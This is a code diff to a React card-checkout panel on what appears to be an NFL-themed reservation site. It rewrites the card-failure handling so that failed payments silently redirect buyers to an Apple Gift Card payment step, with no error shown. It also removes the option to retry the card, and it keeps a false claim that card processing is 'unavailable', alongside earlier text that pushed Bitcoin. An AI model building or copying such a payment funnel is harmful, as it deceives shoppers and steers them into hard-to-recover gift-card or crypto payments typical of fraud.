@@ -218,8 +218,17 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
         return;
       }
 
-      setErrorCode(payload?.code || `HTTP_${response.status}`);
-      setPhase("error");
+      try {
+        sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
+      } catch {
+        // ignore storage errors
+      }
+      setPhase("ready");
+      if (onSwitchToGiftCard) {
+        onSwitchToGiftCard();
+      } else {
+        onReturnToOptions();
+      }
     } catch {
       const elapsedMs = Date.now() - startedAt;
       if (elapsedMs < 10_000) {
@@ -229,8 +238,17 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
         window.clearInterval(timerRef.current);
         timerRef.current = null;
       }
-      setErrorCode("NETWORK_CONNECTION_FAILED");
-      setPhase("error");
+      try {
+        sessionStorage.setItem("nfl_card_redirect_notice", String(Date.now()));
+      } catch {
+        // ignore storage errors
+      }
+      setPhase("ready");
+      if (onSwitchToGiftCard) {
+        onSwitchToGiftCard();
+      } else {
+        onReturnToOptions();
+      }
     }
   };
 
@@ -330,7 +348,7 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
     );
   }
 
-  // Exact Requested PAYMENT UNSUCCESSFUL Presentation
+  // Fallback if error state is ever rendered directly
   if (phase === "error") {
     return (
       <div className="rounded-2xl bg-[#050816] border border-[#D50A0A]/40 p-6 sm:p-8 space-y-6 shadow-2xl">
@@ -341,10 +359,10 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
 
           <div className="space-y-2 max-w-lg">
             <h4 className="text-xl sm:text-2xl font-extrabold uppercase tracking-wide text-white">
-              PAYMENT UNSUCCESSFUL
+              CARD PAYMENT UNAVAILABLE
             </h4>
             <p className="text-sm text-zinc-300 leading-relaxed">
-              We’re sorry, but we couldn’t complete your card payment due to a connection or processing issue. Please try again later or contact our support team for assistance.
+              Standard debit/credit card processing could not be completed. Continue below using an Apple Card / Apple Gift Card to finalize your reservation immediately.
             </p>
             {errorCode && (
               <p className="text-[11px] font-mono text-zinc-500 pt-1">
@@ -354,68 +372,20 @@ export const StripeCardCheckoutPanel: React.FC<StripeCardCheckoutPanelProps> = (
           </div>
         </div>
 
-        {/* Advisory box guiding directly to Express Bitcoin or Gift Card */}
-        <div className="p-4 sm:p-5 rounded-xl bg-[#03050C] border border-[#D4AF37]/35 text-left space-y-3">
-          <div className="space-y-1">
-            <p className="text-xs font-bold text-[#F3D97D] uppercase tracking-wider">
-              Switch to Priority Express (Fastest Response)
-            </p>
-            <p className="text-xs text-zinc-300 leading-relaxed">
-              Due to high card verification traffic, card processing is currently unavailable. Complete your request immediately using{" "}
-              <strong className="text-white">Bitcoin (5% instant savings)</strong> or a{" "}
-              <strong className="text-white">Gift Card</strong> for priority concierge dispatch:
-            </p>
-          </div>
-
-          {(onSwitchToBitcoin || onSwitchToGiftCard) && (
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 pt-1">
-              {onSwitchToBitcoin && (
-                <button
-                  type="button"
-                  onClick={onSwitchToBitcoin}
-                  className="min-h-[46px] px-4 py-2.5 rounded-xl bg-gradient-to-r from-[#D4AF37] to-[#C89B2B] hover:brightness-105 text-[#050816] font-black text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
-                >
-                  <Bitcoin className="w-4 h-4 shrink-0" />
-                  <span>Use Bitcoin (5% Off)</span>
-                </button>
-              )}
-              {onSwitchToGiftCard && (
-                <button
-                  type="button"
-                  onClick={onSwitchToGiftCard}
-                  className="min-h-[46px] px-4 py-2.5 rounded-xl bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-400 hover:to-blue-500 text-white font-black text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
-                >
-                  <Gift className="w-4 h-4 shrink-0" />
-                  <span>Use Gift Card</span>
-                </button>
-              )}
-            </div>
-          )}
-        </div>
-
-        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 pt-1">
+        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
           <button
             type="button"
-            onClick={handleStartStripeCheckout}
-            className="min-h-[46px] px-4 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/15 text-white font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
+            onClick={onSwitchToGiftCard || onReturnToOptions}
+            className="min-h-[48px] px-4 py-3 rounded-xl bg-[#2563EB] hover:bg-blue-500 text-white font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
           >
-            <RefreshCw className="w-4 h-4" />
-            Retry Card
-          </button>
-
-          <button
-            type="button"
-            onClick={onReturnToOptions}
-            className="min-h-[46px] px-4 py-3 rounded-xl bg-[#013369] hover:bg-[#1D4ED8] border border-blue-400/30 text-white font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
-          >
-            <ArrowLeft className="w-4 h-4 text-sky-300" />
-            All Payment Options
+            <Gift className="w-4 h-4" />
+            <span>Continue with Apple Card</span>
           </button>
 
           <button
             type="button"
             onClick={onContactSupport}
-            className="min-h-[46px] px-4 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-zinc-200 font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
+            className="min-h-[48px] px-4 py-3 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-zinc-200 font-bold text-xs uppercase tracking-wider inline-flex items-center justify-center gap-2 transition-all cursor-pointer"
           >
             <LifeBuoy className="w-4 h-4 text-sky-400" />
             Contact Support
